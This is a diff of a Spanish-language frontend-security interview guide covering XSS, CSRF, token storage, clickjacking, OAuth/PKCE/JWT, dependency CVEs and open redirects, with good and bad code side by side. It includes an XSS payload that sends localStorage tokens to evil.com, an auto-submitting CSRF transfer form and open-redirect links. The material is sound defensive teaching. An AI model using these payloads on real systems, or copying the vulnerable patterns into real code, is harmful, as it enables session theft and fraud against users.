@@ -4044,290 +4044,493 @@ usarla; i18n = que funcione bien en cualquier idioma/cultura.
 
 ## 10. Seguridad en frontend
 
-**Seguridad en frontend** no significa “proteger el código del
-navegador” (eso es imposible: cualquiera puede ver, modificar o
-reenviar lo que corre en el cliente). Significa **reducir la superficie
-de ataque** en el navegador y **nunca tratar la UI como autorización**.
-La regla base: el backend valida permisos, autenticación y datos; el
-frontend ayuda con UX, cookies bien configuradas, escape de HTML,
-headers de defensa (**CSP**, *Content Security Policy*) y no filtrar
-secretos en el bundle.
+Esto amplía la sección 4 de `GOOD-FRONTEND-PRACTICES.md` con el nivel de
+detalle que suele pedirse en entrevistas senior: no solo “no uses
+`dangerouslySetInnerHTML`”, sino *por qué* el navegador permite cada
+ataque, en qué orden ocurre y qué control es del frontend frente a qué
+debe vivir en el servidor.
+
+El vocabulario de industria está en **OWASP** (*Open Web Application
+Security Project* — ver Glosario): publica el Top 10 de riesgos web más
+comunes. No es una norma solo de frontend, pero casi todos los ítems
+tienen una cara en el cliente (XSS, CSRF, componentes con CVEs,
+fallos de auth). Regla senior: el frontend **reduce superficie** y
+añade defensa en profundidad; el **perímetro de confianza** es el
+servidor. El navegador del usuario es hostil (DevTools, extensiones,
+XSS).
 
 ### Básico
 
-- El cliente no es de confianza: UI ≠ autorización
+- XSS (*Cross-Site Scripting*): inyección de JavaScript malicioso
 
-  - **Teoría**: ocultar un botón, deshabilitar un menú o no renderizar
-    una ruta en React es **UX**, no seguridad. Un atacante abre DevTools,
-    Postman o escribe un `fetch` a mano y llama al endpoint igual. Quien
-    debe rechazar la acción es el servidor (rol, ownership, scopes).
-  - **Ejemplo**:
+  - **Teoría**: **XSS** (ver Glosario) es la forma más relevante de
+    *Injection* en frontend. El atacante logra que tu origen ejecute JS
+    suyo en el navegador de la víctima: puede leer `localStorage`,
+    manipular el DOM, o llamar a tu API con la sesión de la víctima.
+    React escapa el texto en `{valor}` automáticamente; se pierde esa
+    protección con `dangerouslySetInnerHTML`, `innerHTML`, URLs
+    `javascript:` o `eval`. **CSP** (*Content Security Policy* — ver
+    Glosario) mitiga el impacto limitando de dónde pueden cargarse
+    scripts, pero no sustituye escapar/sanitizar.
+
+  - **Ejemplo paso a paso** (comentario con payload):
+    1. El atacante guarda como comentario:
+       `<img src=x onerror="fetch('https://evil.com?t='+localStorage.token)">`.
+    2. La app lo renderiza con `dangerouslySetInnerHTML` sin sanitizar.
+    3. Otra usuaria abre el hilo; el navegador falla al cargar `src=x` y
+       dispara `onerror`.
+    4. El script corre en el origen de tu app y exfiltra el token.
     ```tsx
-    // Correcto como UX: el admin ve el botón; el resto no
-    {usuario.rol === 'admin' && (
-      <button onClick={eliminarUsuario}>Eliminar</button>
-    )}
-    ```
-    Si `DELETE /users/:id` no revalida el rol en el servidor, cualquier
-    usuario autenticado puede borrarlo sin pasar por ese botón.
-
-- XSS (*Cross-Site Scripting*): inyectar JS en tu página
-
-  - **Teoría**: **XSS** ocurre cuando tu app toma texto que alguien más
-    controló (un comentario, un nombre de usuario, un parámetro de la
-    URL) y lo mete en la página de forma que el **navegador lo trata como
-    código**, no como texto plano. Ejemplo: si un atacante escribe
-    `<script>…</script>` o `<img onerror="…">` en un comentario y la app
-    lo inserta “tal cual” en el HTML, el navegador **ejecuta** ese
-    script en el contexto de tu sitio (con las cookies/tokens de quien
-    abre la página). Con eso pueden leer `localStorage`, cambiar la UI o
-    enviar datos a otro servidor. “Controlado por un atacante” = cualquier
-    dato que no escribió tu propio backend de forma fija: inputs de
-    usuario, contenido de terceros, query strings, etc.
-
-  - **Ejemplo de cómo se ve un XSS en tu página** (flujo completo):
-    1. Tienes un muro de comentarios. El backend guarda lo que el usuario
-       escribe y luego lo muestra a todo el mundo.
-    2. Un atacante publica este “comentario” (no es texto inocente; es
-       HTML/JS disfrazado):
-       ```html
-       <img src="x" onerror="
-         fetch('https://evil.com/robar?t=' + localStorage.getItem('access_token'))
-       ">
-       ```
-       (`onerror` = “cuando falle la carga de la imagen, ejecuta este JS”.
-       La imagen `src="x"` falla a propósito.)
-    3. Tu frontend pinta mal el comentario, sin escapar, p. ej.:
-       ```js
-       // Antipatrón (vanilla o saltándose React)
-       document.getElementById('lista').innerHTML = comentario.texto;
-       ```
-       o en React con `dangerouslySetInnerHTML` y el string crudo.
-    4. Cuando **otra persona** (o tú) abre la página, el navegador inserta
-       esa `<img>`, falla la carga y **corre el JS del atacante dentro de
-       miapp.com**. No hace falta que la víctima haga clic en nada
-       sospechoso: solo ver el comentario ya dispara el robo del token si
-       estaba en `localStorage`.
-    5. Si en cambio pintas con texto escapado (`<p>{comentario.texto}</p>`
-       en React), el usuario **ve** el código en pantalla como caracteres
-       literales y **no se ejecuta** nada.
-
-  - **Soluciones (generales, sin framework)**:
-    1. **Tratar el dato como texto, no como HTML**: al pintar, convertir
-       caracteres especiales (`<`, `>`, `&`, `"`) a entidades (`&lt;`,
-       `&gt;`, …) para que el navegador **muestre** `<script>` en pantalla
-       en vez de **interpretarlo** como etiqueta. Eso se llama
-       **escapar** (*escape*).
-    2. **Si de verdad necesitas HTML** (markdown, editor enriquecido):
-       **sanitizar** primero — quitar/bloquear tags y atributos peligrosos
-       (`script`, `onerror`, `javascript:`) con una librería pensada para
-       eso (p. ej. DOMPurify), no con regex caseras.
-    3. **No asignar HTML crudo** a propiedades del DOM como `innerHTML`
-       con datos no confiables.
-    4. **Reforzar con CSP** (*Content Security Policy*): aunque falle el
-       escape, el navegador puede bloquear scripts inyectados (ver
-       epígrafe de CSP más abajo).
-
-  - **Soluciones en React**:
-    1. **Texto en JSX (`{variable}`)**: React **escapa** por defecto.
-       “Escapa el texto” significa: si `comentario.texto` vale
-       `<script>alert(1)</script>`, React no lo mete como etiqueta
-       `<script>` en el DOM; lo convierte a texto seguro, y el usuario
-       **ve** los caracteres `<script>…</script>` en la página, pero el
-       navegador **no ejecuta** ese script. Por eso
-       `<p>{comentario.texto}</p>` es el camino seguro habitual.
-    2. **`dangerouslySetInnerHTML`**: desactiva ese escape a propósito
-       (“dangerous” = tú asumes el riesgo). React inserta el string como
-       HTML real. Solo úsalo con HTML que **tú** generaste o que ya
-       sanitizaste; nunca con el string crudo del usuario.
-    3. Evita APIs del DOM crudo (`element.innerHTML = …`) dentro de
-       efectos/refs con datos no confiables: saltan las protecciones de
-       React.
-
-  - **Ejemplo (código seguro vs peligroso en React)**:
-    ```tsx
-    // Seguro: React escapa — el navegador muestra el texto, no ejecuta JS
-    <p>{comentario.texto}</p>
-
-    // Peligroso: React NO escapa; interpreta el string como HTML
-    // (aquí es donde el payload del atacante del ejemplo de arriba sí corre)
-    <div dangerouslySetInnerHTML={{ __html: comentario.texto }} />
-
-    // Si necesitas HTML: sanitiza antes
-    // <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
-    ```
-
-- CSRF (*Cross-Site Request Forgery*): otra web fuerza tu petición
-
-  - **Teoría**: **CSRF** aprovecha que el navegador **envía cookies
-    automáticamente** al dominio de la API. Un sitio malicioso puede
-    disparar un `POST` a tu backend mientras la víctima está logueada.
-    Mitigación moderna: cookies con `SameSite=Strict` o `Lax` (el
-    navegador no las manda en contextos cross-site problemáticos), más
-    tokens CSRF o preferir auth por header (`Authorization: Bearer …`)
-    en vez de cookie de sesión para APIs de SPA cuando el diseño lo
-    permite.
-  - **Ejemplo**:
-    ```
-    Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict
-    ```
-    `HttpOnly` = JS no puede leer la cookie (mitiga robo vía XSS).
-    `Secure` = solo viaja por HTTPS. `SameSite=Strict` = no se envía
-    en peticiones originadas desde otro sitio.
-
-- Dónde guardar tokens y datos sensibles
-
-  - **Teoría**: `localStorage` / `sessionStorage` son legibles desde
-    cualquier JS de la página: un XSS los vacía. El **access token**
-    (corto, a menudo un **JWT**) debería vivir **en memoria**; el
-    **refresh token** (larga vida) en cookie `HttpOnly` + `Secure` +
-    `SameSite`. Nunca pongas secretos de servidor, API keys privadas ni
-    passwords en el bundle del frontend (todo es público). No pongas
-    tokens en la URL (quedan en historial, logs y `Referer`).
-  - **Ejemplo**:
-    ```ts
-    // Mal: cualquier XSS puede hacer localStorage.getItem('token')
-    localStorage.setItem('access_token', token);
-
-    // Mejor: solo en memoria del proceso JS
-    let accessToken: string | null = token;
-    ```
-
-- CORS: qué protege y qué no
-
-  - **Teoría**: **CORS** (*Cross-Origin Resource Sharing*, ya visto en
-    la sección 1) limita que un script de **otro origen** pueda *leer*
-    la respuesta en el navegador. No autentica usuarios, no sustituye
-    permisos en el backend y no impide que alguien llame a tu API desde
-    curl/Postman. Un CORS “abierto” (`Access-Control-Allow-Origin: *`
-    con credenciales mal configuradas) es un *misconfiguration*; uno
-    bien acotado es higiene, no el muro principal.
-  - **Ejemplo**: el error `blocked by CORS policy` lo aplica el
-    **navegador** al frontend; el servidor solo declara qué orígenes
-    puede leer la respuesta. La API sigue siendo alcanzable fuera del
-    navegador.
-
-- Dependencias, secretos en el bundle y clickjacking
-
-  - **Teoría**: librerías desactualizadas con **CVE** (*Common
-    Vulnerabilities and Exposures* — identificador público de un fallo
-    conocido) son un riesgo real en frontend (XSS en un markdown
-    renderer, prototype pollution, etc.). Revisa con `npm audit` /
-    Dependabot y actualiza. El *clickjacking* mete tu app en un iframe
-    transparente para engañar clics; se mitiga con
-    `Content-Security-Policy: frame-ancestors 'none'` (o
-    `X-Frame-Options: DENY`).
-  - **Ejemplo**:
-    ```
-    Content-Security-Policy: frame-ancestors 'none'
-    ```
-
-### En profundidad
-
-- Flujo OAuth 2.0 + OIDC con PKCE, paso a paso
-
-  - **Teoría**: **OAuth 2.0** es un protocolo de **autorización**
-    (delega acceso a un recurso sin compartir la contraseña); **OIDC**
-    (*OpenID Connect* — ver Glosario) se construye encima para añadir
-    **autenticación** (quién es el usuario, no solo qué puede hacer).
-    Un backend puede guardar un *client secret*; una **SPA** (*Single
-    Page Application*) no — todo el código es visible: es un *cliente
-    público*. **PKCE** (*Proof Key for Code Exchange*) resuelve eso sin
-    secreto fijo: la app genera un secreto **temporal de un solo uso**
-    por login; si alguien intercepta el código de autorización, no puede
-    canjearlo sin ese secreto efímero.
-  - **Ejemplo paso a paso**:
-    1. La SPA genera un `code_verifier` aleatorio y su hash SHA-256, el
-       `code_challenge`.
-    2. Redirige al usuario al proveedor de identidad con el
-       `code_challenge` (el verifier aún no sale del navegador):
-       ```
-       GET https://auth.miapp.com/authorize
-         ?client_id=abc123&response_type=code
-         &code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM
-         &code_challenge_method=S256
-       ```
-    3. El usuario se autentica y vuelve con un `code` de un solo uso.
-    4. La SPA canjea ese `code` **junto con el `code_verifier` original**:
-       ```ts
-       fetch('https://auth.miapp.com/token', {
-         method: 'POST',
-         body: new URLSearchParams({
-           grant_type: 'authorization_code',
-           code,
-           code_verifier,
-         }),
-       });
-       ```
-    5. El servidor recalcula el hash del `code_verifier` y lo compara
-       con el `code_challenge` del paso 2. Sin el verifier original
-       (que nunca viajó en la URL), el intercambio falla.
-
-- Access token vs refresh token: dónde debe vivir cada uno
-
-  - **Teoría**: el **access token** (suele ser un **JWT**, *JSON Web
-    Token*) dura poco (minutos) y va en cada petición a la API — si se
-    filtra, la ventana de daño es corta. El **refresh token** dura mucho
-    y solo sirve para pedir un access token nuevo; si se filtra, el daño
-    es mayor. Por eso el refresh token va en cookie `HttpOnly` (JS no lo
-    ve); el access token, en memoria, nunca en `localStorage`.
-  - **Ejemplo**:
-    ```
-    # El backend setea el refresh; el JS del frontend nunca lo toca
-    Set-Cookie: refresh_token=eyJ...; HttpOnly; Secure; SameSite=Strict
-    ```
-    ```ts
-    let accessToken: string | null = null;
-
-    async function renovarAccessToken() {
-      // La cookie HttpOnly viaja sola con credentials: 'include'
-      const res = await fetch('/auth/refresh', { credentials: 'include' });
-      const { accessToken: nuevo } = await res.json();
-      accessToken = nuevo; // solo en memoria
+    // El hueco: HTML de usuario sin sanitizar
+    function Comentario({ html }: { html: string }) {
+      return <div dangerouslySetInnerHTML={{ __html: html }} />;
     }
     ```
 
-- CSP avanzada con nonces y `strict-dynamic`
+  - **Buenas prácticas** (cada una con mal / bien):
+    - Preferir texto (React escapa por defecto).
+      ```tsx
+      // Mal
+      <div dangerouslySetInnerHTML={{ __html: userComment }} />
 
-  - **Teoría**: una **CSP** básica (`script-src 'self'`) bloquea scripts
-    de otros orígenes, pero se vuelve rígida con analytics o A/B testing
-    (cada dominio nuevo obliga a editar la política). Una **nonce**
-    (número de un solo uso) la genera el servidor en cada respuesta y la
-    pone en el header CSP y en el atributo `nonce` del `<script>`: solo
-    esos scripts corren. `'strict-dynamic'` extiende esa confianza: un
-    script ya autorizado puede cargar otros con
-    `document.createElement('script')` sin listar dominios (caso típico
-    de analytics que cargan sub-scripts).
-  - **Ejemplo**:
-    ```
-    Content-Security-Policy: script-src 'self' 'nonce-r4nd0mAB12' 'strict-dynamic'
-    ```
+      // Bien
+      <div>{userComment}</div>
+      ```
+    - Si necesitas HTML: sanitizar (p. ej. DOMPurify) antes de insertar.
+      ```tsx
+      import DOMPurify from 'dompurify';
+
+      // Mal
+      <article dangerouslySetInnerHTML={{ __html: post.body }} />
+
+      // Bien
+      <article
+        dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.body) }}
+      />
+      ```
+    - No guardar tokens de sesión donde cualquier JS pueda leerlos.
+      ```ts
+      // Mal
+      localStorage.setItem('access_token', jwt);
+
+      // Bien — cookie HttpOnly puesta por el servidor (JS no la lee)
+      // Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict
+      ```
+    - Evitar APIs que ejecutan strings como código.
+      eval ejecuta el string que recibe como código JavaScript. Esto es muy peligroso porque permite ejecutar código arbitrario, lo que abre la puerta a vulnerabilidades como XSS y ataques de inyección de código.
+      ```ts
+      // Mal
+      eval(userInput);
+      el.innerHTML = userInput;
+
+      // Bien
+      el.textContent = userInput;
+      ```
+    - CSP como red de seguridad (defensa en profundidad).
+      ```http
+      # Mal: sin CSP, o script-src 'unsafe-inline' 'unsafe-eval'
+
+      # Bien
+      Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
+      ```
+
+- CSRF (*Cross-Site Request Forgery*): peticiones no deseadas con la
+  sesión de la víctima
+
+  - **Teoría**: **CSRF** (ver Glosario) aprovecha que las cookies de un
+    dominio se envían **automáticamente** en peticiones a ese dominio.
+    Un sitio malicioso no puede *leer* la respuesta (SOP / same-origin
+    policy), pero sí puede *disparar* un `POST`/`GET` que el navegador
+    autentica con la cookie de sesión. Por eso `SameSite` en cookies,
+    tokens CSRF en header, o auth vía `Authorization: Bearer` (que no
+    se adjunta sola a otro origen) son las mitigaciones clásicas.
+
+  - **Ejemplo paso a paso**:
+    1. La víctima está logueada en `banco.com` (cookie de sesión).
+    2. Visita `evil.com`.
+    3. `evil.com` auto-envía un formulario a `banco.com/api/transferir`.
+    4. El navegador adjunta la cookie; el servidor cree que fue la
+       usuaria quien lo pidió.
     ```html
-    <script nonce="r4nd0mAB12" src="/analytics.js"></script>
-
-    <!-- Sin la nonce exacta, el navegador lo bloquea aunque haya XSS -->
-    <script src="https://evil.com/malware.js"></script>
+    <!-- En evil.com -->
+    <form action="https://banco.com/api/transferir" method="POST">
+      <input name="to" value="atacante" />
+      <input name="amount" value="1000" />
+    </form>
+    <script>document.forms[0].submit();</script>
     ```
-    La nonce debe regenerarse **en cada respuesta**; si es fija, quien la
-    descubra puede reutilizarla para autorizar su script.
 
-- OWASP Top 10: cómo clasifica la industria estos riesgos
+  - **Buenas prácticas**:
+    - Cookie de sesión con `HttpOnly`, `Secure` y `SameSite`.
+      ```http
+      # Mal
+      Set-Cookie: session=abc; Path=/
 
-  - **Teoría**: **OWASP** (*Open Web Application Security Project*) es
-    una organización que publica el **Top 10** de riesgos de seguridad
-    web más comunes. No es una checklist “solo de frontend”: es el
-    vocabulario estándar de la industria (entrevistas, auditorías,
-    priorización). Varias entradas tienen cara clara de cliente:
-    *Broken Access Control* (UI oculta ≠ permiso real); *Injection*
-    (en frontend, sobre todo XSS); *Identification and Authentication
-    Failures* (tokens mal guardados, sesiones que no expiran);
-    *Security Misconfiguration* (CSP ausente/débil, CORS mal planteado);
-    *Vulnerable and Outdated Components* (dependencias con CVE).
-  - **Ejemplo**: en una entrevista, en vez de “tenemos seguridad”,
-    puedes mapear: “el riesgo de ocultar el botón de admin es Broken
-    Access Control — lo mitigamos validando rol en API; XSS lo
-    contenemos con escape + CSP; los tokens siguen el patrón access en
-    memoria / refresh HttpOnly”.
+      # Bien
+      Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict; Path=/
+      ```
+    - Token CSRF o header custom que el atacante no puede leer (SOP).
+      ```ts
+      // Mal — solo cookie, sin prueba de origen
+      fetch('/api/transferir', {
+        method: 'POST',
+        credentials: 'include',
+        body: JSON.stringify({ to: 'x', amount: 1000 }),
+      });
+
+      // Bien
+      fetch('/api/transferir', {
+        method: 'POST',
+        credentials: 'include',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-CSRF-Token': csrfToken,
+        },
+        body: JSON.stringify({ to: 'x', amount: 1000 }),
+      });
+      ```
+    - Preferir Bearer en header frente a cookie automática para la API.
+      ```ts
+      // Mal — sesión solo en cookie sin SameSite ni CSRF token
+
+      // Bien
+      fetch('/api/transferir', {
+        method: 'POST',
+        headers: {
+          Authorization: `Bearer ${accessToken}`,
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ to: 'x', amount: 10 }),
+      });
+      ```
+    - No usar `SameSite=None` “por si acaso”.
+      ```http
+      # Mal — cross-site siempre, sin necesidad
+      Set-Cookie: session=abc; SameSite=None; Secure
+
+      # Bien — Lax o Strict salvo embeds cross-site reales y documentados
+      Set-Cookie: session=abc; SameSite=Lax; Secure; HttpOnly
+      ```
+
+- Autorización solo en el cliente no es seguridad (UX ≠ garantía)
+
+  - **Teoría**: ocultar un botón o validar un formulario en React mejora
+    la **UX** (*User Experience* — ver Glosario), pero no es una
+    garantía de seguridad. Quien controla el cliente puede llamar a la
+    API directo (curl, DevTools, script). Toda regla de rol, permiso o
+    invariante de negocio debe revalidarse en el servidor.
+
+  - **Ejemplo paso a paso**:
+    1. El frontend hace `{user.role === 'admin' && <button>Borrar</button>}`.
+    2. El atacante (u otro rol) llama `DELETE /admin/wipe` con su token.
+    3. Si el backend no comprueba el rol → la acción se ejecuta.
+
+  - **Buenas prácticas**:
+    - Autorización en el servidor; el frontend solo condiciona la UI.
+      ```tsx
+      // Mal — solo frontend; el backend no exige rol
+      {user.role === 'admin' && (
+        <button onClick={() => fetch('/admin/wipe', { method: 'DELETE' })}>
+          Borrar todo
+        </button>
+      )}
+
+      // Bien — UI + garantía real
+      {canWipe && <button onClick={wipe}>Borrar</button>}
+      // backend: app.delete('/admin/wipe', requireAuth, requireRole('admin'), handler)
+      ```
+    - Validación de negocio crítica también en backend.
+      ```ts
+      // Mal — solo cliente
+      if (amount > balance) return alert('Fondos insuficientes');
+      await transfer({ amount });
+
+      // Bien — UX rápida + rechazo en servidor
+      if (amount > balance) return setError('Fondos insuficientes');
+      await transfer({ amount });
+      // servidor: if (amount > account.balance) return 400
+      ```
+
+- Secretos y tokens en el bundle / storage del cliente
+
+  - **Teoría**: todo lo que llega al JS del navegador es público
+    (bundle, Network, Application). Un `VITE_*` / `NEXT_PUBLIC_*` no es
+    un secreto: se embebe en el cliente. Un **JWT** (*JSON Web Token* —
+    ver Glosario) en `localStorage` es legible por cualquier XSS. Los
+    secretos de servidor (DB, Stripe secret, client secret de OAuth)
+    solo viven en backend o BFF.
+
+  - **Ejemplo paso a paso**:
+    1. La SPA guarda el access token en `localStorage` “porque es cómodo”.
+    2. Existe un XSS (o una extensión maliciosa).
+    3. El script lee `localStorage.getItem('token')` y lo envía fuera.
+    4. El atacante reutiliza el token contra la API.
+
+  - **Buenas prácticas**:
+    - Nunca secretos de servidor en variables públicas del frontend.
+      ```ts
+      // Mal — acaba en el bundle del cliente
+      const key = import.meta.env.VITE_STRIPE_SECRET_KEY;
+
+      // Bien — solo en servidor; el cliente llama a tu BFF
+      // process.env.STRIPE_SECRET_KEY  (sin prefijo público)
+      ```
+    - Access token en memoria (o cookie HttpOnly vía BFF), no en
+      `localStorage`.
+      ```ts
+      // Mal
+      localStorage.setItem('token', accessToken);
+
+      // Bien — memoria de proceso (se pierde al refrescar; combinar con refresh HttpOnly)
+      let accessToken: string | null = null;
+      export const setAccessToken = (t: string) => {
+        accessToken = t;
+      };
+      export const getAccessToken = () => accessToken;
+      ```
+    - Refresh token solo en cookie `HttpOnly`.
+      ```ts
+      // Mal
+      localStorage.setItem('refresh_token', refresh);
+
+      // Bien (lo setea el servidor)
+      // Set-Cookie: refresh=...; HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh
+      ```
+
+### En profundidad
+
+- Clickjacking y framing hostil
+
+  - **Teoría**: el atacante embebe tu app en un `<iframe>` casi invisible
+    sobre un botón falso. El usuario cree hacer clic en “ganar premio”;
+    el clic cae en “confirmar transferencia” de tu origen autenticado.
+    Se mitiga diciéndole al navegador quién puede enmarcar tu página:
+    **CSP** `frame-ancestors` (moderno) o `X-Frame-Options` (legacy).
+
+  - **Ejemplo paso a paso**:
+    1. `evil.com` pone `<iframe src="https://tuapp.com/confirmar-pago">`.
+    2. Lo estiliza con `opacity: 0` encima de un CTA atractivo.
+    3. El clic del usuario activa la UI autenticada dentro del iframe.
+
+  - **Buenas prácticas**:
+    - Bloquear framing por defecto.
+      ```http
+      # Mal — sin headers; cualquier sitio puede iframearte
+
+      # Bien
+      Content-Security-Policy: frame-ancestors 'none'
+      X-Frame-Options: DENY
+      ```
+    - Si hay embeds legítimos, allowlist explícita (nunca `*`).
+      ```http
+      # Mal
+      Content-Security-Policy: frame-ancestors *
+
+      # Bien
+      Content-Security-Policy: frame-ancestors https://partner.confiable.com
+      ```
+
+- Auth en SPAs: OAuth, OIDC, PKCE y JWT
+
+  - **Teoría**: en un “Login with Google” (o Auth0, Keycloak, etc.)
+    conviven cuatro piezas distintas; cada una responde una pregunta
+    diferente. Confundirlas es el error típico en entrevistas.
+
+    **OAuth 2.0** (*Open Authorization* — ver Glosario) es un protocolo
+    de **autorización**, no de “quién soy”. Resuelve: ¿puede
+    `miapp.com` leer mis repos de GitHub *sin* que yo le dé mi
+    contraseña de GitHub? Piezas: el usuario (*resource owner*), tu SPA
+    o backend (*client*), quien emite permisos (*authorization server* /
+    IdP), la API que guarda los datos (*resource server*) y los
+    *scopes* (qué se permite: `read:email`, `orders:write`). El
+    resultado típico es un **access token** (y a veces un **refresh
+    token**). Analogía: llave de habitación de hotel (acceso limitado y
+    temporal), no la llave maestra del edificio (tu password).
+
+    **OIDC** (*OpenID Connect* — ver Glosario) es una capa de
+    **autenticación** encima de OAuth 2.0. OAuth solo dice “esta app
+    puede acceder a estos recursos”; OIDC añade “y el usuario es Ana,
+    email ana@…, `sub=abc123`”. Lo hace con un token extra: el **ID
+    token** (casi siempre un JWT), pensado para que *tu app* conozca la
+    identidad. El access token sigue siendo para llamar APIs. En la
+    práctica, “Login with Google” en una SPA suele ser OIDC (identidad)
+    usando el flujo de OAuth (tokens/scopes).
+
+    | | OAuth | OIDC |
+    |---|---|---|
+    | Pregunta | ¿Qué puede hacer la app? | ¿Quién es el usuario? |
+    | Token clave | access (y refresh) | ID token (+ access) |
+    | Uso | autorización a APIs | login / sesión de identidad |
+
+    **PKCE** (*Proof Key for Code Exchange*, “pixy” — ver Glosario) no
+    reemplaza a OAuth/OIDC: es una **extensión de seguridad** del flujo
+    *authorization code*. Una SPA es un *cliente público*: cualquiera
+    puede ver su JS, así que no puede proteger un `client_secret` como
+    haría un backend. Sin PKCE, un atacante que robe el `code` de la
+    URL de redirect (`?code=...`) puede canjearlo por tokens. Con PKCE:
+    (1) la app genera un secreto aleatorio `code_verifier`; (2) manda
+    solo su hash `code_challenge` (típicamente **SHA**-256 — ver
+    Glosario) a `/authorize`; (3) al canjear el `code` debe enviar el
+    verifier original; (4) el servidor comprueba que el hash coincide.
+    Robar el `code` de la barra de direcciones no alcanza: falta el
+    verifier, que nunca salió de la app que inició el login.
+
+    **JWT** (*JSON Web Token* — ver Glosario) no es un protocolo: es un
+    **formato** de token en tres partes Base64url separadas por `.`
+    (`header.payload.signature`). El payload lleva *claims* (`sub`,
+    `email`, `scope`, `exp`); la firma permite verificar que nadie lo
+    alteró. Un access token *puede* ser un JWT o un string opaco; el ID
+    token de OIDC *sí* es un JWT por especificación. Un JWT **no** va
+    cifrado por defecto: quien lo tenga puede leer el payload. La
+    seguridad está en no filtrarlo y en validar firma + `exp` en el
+    servidor.
+
+    Cómo encajan en una frase: con **OIDC** (sobre **OAuth**) el
+    usuario inicia sesión en el IdP; **PKCE** protege el canje del
+    `code` en la SPA; el IdP devuelve tokens y el access/ID token suele
+    ir en formato **JWT**.
+
+  - **Ejemplo paso a paso** (authorization code + PKCE):
+    1. La SPA genera `code_verifier` aleatorio y
+       `code_challenge = BASE64URL(SHA256(verifier))` (PKCE).
+    2. Redirige a `/authorize?...&code_challenge=...&code_challenge_method=S256`
+       (OAuth/OIDC).
+    3. El usuario se autentica en el IdP; este redirige con `?code=...`.
+    4. La SPA (o mejor un BFF) canjea `code` + `code_verifier` por
+       tokens: access (+ refresh) y, si es OIDC, ID token.
+    5. El access token (a menudo un JWT) va en `Authorization: Bearer`;
+       el ID token (JWT) identifica al usuario; el refresh queda en
+       cookie HttpOnly si usas BFF.
+
+  - **Buenas prácticas**:
+    - No embeber `client_secret` en el frontend.
+      ```ts
+      // Mal
+      await fetch('/token', {
+        body: JSON.stringify({ code, client_secret: 'supersecreto' }),
+      });
+
+      // Bien — PKCE / cliente público (sin secret) o intercambio en BFF
+      const params = new URLSearchParams({
+        client_id: publicClientId,
+        code_challenge: challenge,
+        code_challenge_method: 'S256',
+        // sin client_secret
+      });
+      ```
+    - Preferir BFF que setee cookies HttpOnly a exponer refresh al JS.
+      ```ts
+      // Mal — refresh en localStorage tras el callback OAuth
+      localStorage.setItem('refresh', tokens.refresh_token);
+
+      // Bien — el BFF intercambia el code y responde Set-Cookie HttpOnly;
+      // el frontend solo mantiene el access token en memoria (corto)
+      ```
+    - Tratar el JWT como *credencial*: corta expiración, HTTPS, no
+      loguearlo.
+      ```ts
+      // Mal
+      console.log('login ok', accessToken);
+      localStorage.setItem('jwt', accessToken);
+
+      // Bien
+      setAccessToken(accessToken); // memoria
+      // Authorization solo por HTTPS; renovar antes de exp
+      ```
+
+- Dependencias vulnerables (CVE en npm)
+
+  - **Teoría**: un **CVE** (*Common Vulnerabilities and Exposures* — ver
+    Glosario) identifica una vulnerabilidad conocida. En frontend suele
+    aparecer en parsers de HTML/Markdown, template engines o libs de
+    auth. Tu código puede ser correcto y aun así quedar expuesto por una
+    dependencia transitiva desactualizada.
+
+  - **Ejemplo paso a paso**:
+    1. Instalas un renderer de Markdown.
+    2. Se publica un CVE de XSS en esa versión.
+    3. Sigues en producción sin actualizar.
+    4. Un post con payload malicioso se renderiza y ejecuta script.
+
+  - **Buenas prácticas**:
+    - Auditar y actualizar de forma habitual.
+      ```bash
+      # Mal — nunca audit; pin eterno a una major vulnerable
+
+      # Bien
+      npm audit
+      npm update paquete-vulnerable
+      ```
+    - No renderizar HTML/Markdown de usuario sin sanitizar + versión
+      parcheada.
+      ```ts
+      // Mal
+      el.innerHTML = marked.parse(userMarkdown);
+
+      // Bien
+      import { marked } from 'marked';
+      import DOMPurify from 'dompurify';
+      el.innerHTML = DOMPurify.sanitize(
+        marked.parse(userMarkdown) as string,
+      );
+      ```
+
+- Open redirects tras login u otras redirecciones controladas por
+  query params
+
+  - **Teoría**: si tras autenticarte haces
+    `location = params.get('redirect')` sin validar, un atacante manda
+    un link `tuapp.com/login?redirect=https://evil.com/fake-login`. La
+    víctima confía en el dominio de login y termina en phishing. La
+    defensa es allowlist de paths relativos (o de rutas conocidas),
+    nunca URLs absolutas arbitrarias.
+
+  - **Ejemplo paso a paso**:
+    1. El atacante comparte `/login?redirect=https://evil.com/fake-login`.
+    2. La víctima se autentica en tu IdP legítimo.
+    3. Tu app redirige al valor de `redirect` sin filtrar.
+    4. `evil.com` imita tu UI y pide la contraseña otra vez.
+
+  - **Buenas prácticas**:
+    - Solo paths relativos seguros (no `//evil.com`).
+      ```ts
+      // Mal
+      window.location = params.get('redirect')!;
+
+      // Bien
+      const next = params.get('redirect') ?? '/';
+      const safe =
+        next.startsWith('/') && !next.startsWith('//') ? next : '/';
+      navigate(safe);
+      ```
+    - Mejor: lista blanca de rutas de la app.
+      ```ts
+      // Mal — aceptar cualquier string que “parezca” path
+
+      // Bien
+      const ALLOWED = new Set(['/dashboard', '/settings', '/orders']);
+      const next = params.get('redirect') ?? '/dashboard';
+      navigate(ALLOWED.has(next) ? next : '/dashboard');
+      ```
+
+- Mapa rápido riesgo → defensa (para entrevistas)
+
+  - **Teoría**: en una entrevista senior suelen pedir priorizar. El
+    orden mental útil: (1) no ejecutar input como código, (2) no
+    confiar la auth al storage legible por JS, (3) no autorizar solo en
+    UI, (4) cookies con flags correctos / Bearer + PKCE, (5) headers
+    CSP/`frame-ancestors`, (6) supply chain (CVEs).
+
+  | Riesgo | Defensa principal |
+  |---|---|
+  | XSS | Escape / sanitizar + CSP + no tokens en `localStorage` |
+  | CSRF | `SameSite` / Bearer / CSRF token |
+  | Robo de sesión | `HttpOnly` + `Secure` + expiración corta |
+  | Auth débil en SPA | OAuth/OIDC + PKCE (+ BFF si puedes) |
+  | “Seguridad” solo UI | Validar siempre en backend |
